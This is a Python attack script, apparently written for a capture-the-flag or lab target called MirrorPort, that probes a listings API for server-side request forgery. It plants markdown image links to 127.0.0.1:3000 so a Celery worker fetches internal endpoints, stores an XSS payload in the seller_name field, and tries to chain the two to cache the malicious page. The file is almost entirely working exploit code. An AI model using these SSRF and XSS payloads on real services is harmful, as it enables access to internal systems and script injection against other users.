#!/usr/bin/env python3
"""
Direct SSRF test for MirrorPort
Tests if we can trigger Celery to fetch internal URLs and observe the cache
"""

import requests
import json
import time
import sys

def test_ssrf(base_url):
    """Test SSRF capability"""
    print(f"[*] Testing SSRF against {base_url}")

    # Create a listing with a markdown image URL pointing to internal API
    session = requests.Session()

    # Test 1: Fetch internal API listings
    print("\n[+] Test 1: Fetch internal /api/listings")
    listing_data = {
        "seller_name": "TestSeller",
        "scroll_name": "Test SSRF",
        "price": 100,
        "note": f"![](http://127.0.0.1:3000/api/listings)",
        "description": "Testing SSRF"
    }

    resp = session.post(f"{base_url}/api/listings", json=listing_data)
    if resp.status_code == 201:
        listing = resp.json()
        listing_id = listing['id']
        print(f"[*] Listing created: ID={listing_id}")

        # Wait for Celery to process
        print("[*] Waiting for Celery processing...")
        for i in range(10):
            status_resp = session.get(f"{base_url}/api/listings/{listing_id}/status")
            if status_resp.status_code == 200:
                if status_resp.json().get('processed'):
                    print(f"[*] Listing processed!")
                    break
            time.sleep(2)

        # Check cache
        print(f"[*] Checking cache files...")
        # Try to list cache directory via the app
        cache_resp = session.get(f"{base_url}/cache/")
        print(f"Cache listing status: {cache_resp.status_code}")
        if cache_resp.status_code == 200:
            print(f"Cache content: {cache_resp.text[:500]}")

    # Test 2: Try to cache an XSS payload
    print("\n[+] Test 2: Cache XSS payload")

    # First create listing with XSS
    xss_listing = {
        "seller_name": '<img src=x onerror="alert(1)">',
        "scroll_name": "XSS Test",
        "price": 200,
        "description": "XSS payload in seller_name"
    }

    resp = session.post(f"{base_url}/api/listings", json=xss_listing)
    if resp.status_code == 201:
        xss_id = resp.json()['id']
        print(f"[*] XSS listing created: ID={xss_id}")

        # Now use SSRF to cache the /sandbox page
        note_with_ssrf = f"![](http://127.0.0.1:3000/sandbox/{xss_id})"
        ssrf_listing = {
            "seller_name": "SSRFTester",
            "scroll_name": "Cache XSS",
            "price": 300,
            "note": note_with_ssrf,
            "description": "Using SSRF to cache /sandbox"
        }

        resp = session.post(f"{base_url}/api/listings", json=ssrf_listing)
        if resp.status_code == 201:
            cache_id = resp.json()['id']
            print(f"[*] SSRF listing created: ID={cache_id}")

            # Wait for processing
            for i in range(10):
                status_resp = session.get(f"{base_url}/api/listings/{cache_id}/status")
                if status_resp.status_code == 200 and status_resp.json().get('processed'):
                    print(f"[*] SSRF listing processed!")
                    break
                time.sleep(2)

            # Try to access the cached sandbox page
            sandbox_url = f"{base_url}/sandbox/{xss_id}"
            print(f"[*] Original sandbox URL: {sandbox_url}")

            # Check if cache files exist by trying to guess the filename
            # cache files are: cache_{listing_id}_{md5_hash}.ext
            print("[*] This would need actual cache file enumeration...")

    print("\n[!] Tests completed. Need more sophisticated approach for parameter injection.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python test_direct_ssrf.py <base_url>")
        sys.exit(1)

    test_ssrf(sys.argv[1])
